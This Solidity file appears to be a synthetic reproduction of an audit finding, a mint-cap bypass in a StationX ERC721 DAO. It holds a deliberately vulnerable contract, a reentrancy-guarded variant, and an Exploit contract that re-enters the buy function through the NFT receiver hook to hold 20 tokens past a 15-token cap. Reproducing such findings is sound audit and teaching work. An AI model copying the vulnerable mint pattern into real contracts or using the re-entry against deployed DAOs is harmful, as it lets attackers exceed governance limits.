// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  StationX — maxTokensPerUser bypass on ERC721 DAO mint (Pashov, finding #41385)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: buyGovernanceTokenERC721DAO checks the per-user cap, then mintToken
    checks it again and _safeMint's one token at a time. The receiver hook runs before
    the rest of the purchase is minted, so a second buy still sees a balance under the cap.
    Vulnerable line preserved verbatim below (@> VULN). */

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract ERC721DAO {
    error MaxTokensMintedForUser(address to);

    struct ERC721DaoDetails {
        uint256 maxTokensPerUser;
        bool isNftTotalSupplyUnlimited;
    }

    struct DAODetails {
        uint256 distributionAmount;
    }

    ERC721DaoDetails public erc721DaoDetails;
    address public factoryAddress;
    uint256 public _tokenIdTracker;
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    function setFactory(address factory) external {
        factoryAddress = factory;
    }

    function setDetails(uint256 maxPerUser, bool unlimited) external {
        erc721DaoDetails = ERC721DaoDetails({maxTokensPerUser: maxPerUser, isNftTotalSupplyUnlimited: unlimited});
    }

    function maxTokensPerUser() external view returns (uint256) {
        return erc721DaoDetails.maxTokensPerUser;
    }

    function mintToken(address _to, string calldata, uint256 _amount) external {
        require(msg.sender == factoryAddress, "only factory");
        if (balanceOf[_to] + _amount > erc721DaoDetails.maxTokensPerUser) {
            revert MaxTokensMintedForUser(_to);
        }

        if (!erc721DaoDetails.isNftTotalSupplyUnlimited) {
            require(
                Factory(factoryAddress).getDAOdetails(address(this)).distributionAmount >= _tokenIdTracker + _amount,
                "Max supply reached"
            );
        }
        for (uint256 i; i < _amount;) {
            _tokenIdTracker += 1;
            _safeMint(_to, _tokenIdTracker);
            unchecked {
                ++i;
            }
        }
    }

    function _safeMint(address to, uint256 tokenId) internal {
        require(ownerOf[tokenId] == address(0), "exists");
        ownerOf[tokenId] = to;
        balanceOf[to] += 1;
        if (to.code.length > 0) {
            // @> VULN: the hook runs before the rest of _amount is minted, so balanceOf is only partially updated
            bytes4 ret = IERC721Receiver(to).onERC721Received(msg.sender, address(0), tokenId, "");
            require(ret == IERC721Receiver.onERC721Received.selector, "receiver");
        }
    }
}

contract Factory {
    ERC721DAO public dao;
    uint256 public distributionAmount;

    constructor(ERC721DAO _dao) {
        dao = _dao;
    }

    function setDistribution(uint256 amount) external {
        distributionAmount = amount;
    }

    function getDAOdetails(address) external view returns (ERC721DAO.DAODetails memory) {
        return ERC721DAO.DAODetails({distributionAmount: distributionAmount});
    }

    function buyGovernanceTokenERC721DAO(address buyer, uint256 amount) external {
        uint256 held = dao.balanceOf(buyer);
        if (held + amount > dao.maxTokensPerUser()) revert ERC721DAO.MaxTokensMintedForUser(buyer);
        dao.mintToken(buyer, "", amount);
    }
}

contract FactoryGuarded {
    ERC721DAO public dao;
    uint256 public distributionAmount;
    bool private entered;

    constructor(ERC721DAO _dao) {
        dao = _dao;
    }

    function setDistribution(uint256 amount) external {
        distributionAmount = amount;
    }

    function getDAOdetails(address) external view returns (ERC721DAO.DAODetails memory) {
        return ERC721DAO.DAODetails({distributionAmount: distributionAmount});
    }

    function buyGovernanceTokenERC721DAO(address buyer, uint256 amount) external {
        require(!entered, "reentered");
        entered = true;
        uint256 held = dao.balanceOf(buyer);
        if (held + amount > dao.maxTokensPerUser()) revert ERC721DAO.MaxTokensMintedForUser(buyer);
        dao.mintToken(buyer, "", amount);
        entered = false;
    }
}

contract GuardedBuyer {
    FactoryGuarded public factory;
    bool private tried;

    constructor(FactoryGuarded _factory) {
        factory = _factory;
    }

    function buy() external {
        factory.buyGovernanceTokenERC721DAO(address(this), 10);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!tried) {
            tried = true;
            try factory.buyGovernanceTokenERC721DAO(address(this), 10) {} catch {}
        }
        return this.onERC721Received.selector;
    }
}

contract Exploit {
    ERC721DAO public dao; // CREATE nonce 1
    Factory public factory; // CREATE nonce 2
    bool private reentered;

    constructor() {
        dao = new ERC721DAO();
        factory = new Factory(dao);
        dao.setFactory(address(factory));
        dao.setDetails(15, false);
        factory.setDistribution(100);
    }

    function run() external {
        factory.buyGovernanceTokenERC721DAO(address(this), 10);
        uint256 held = dao.balanceOf(address(this));
        require(held == 20, "cap bypass");
        require(dao.maxTokensPerUser() == 15, "max");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!reentered) {
            reentered = true;
            factory.buyGovernanceTokenERC721DAO(address(this), 10);
        }
        return this.onERC721Received.selector;
    }
}
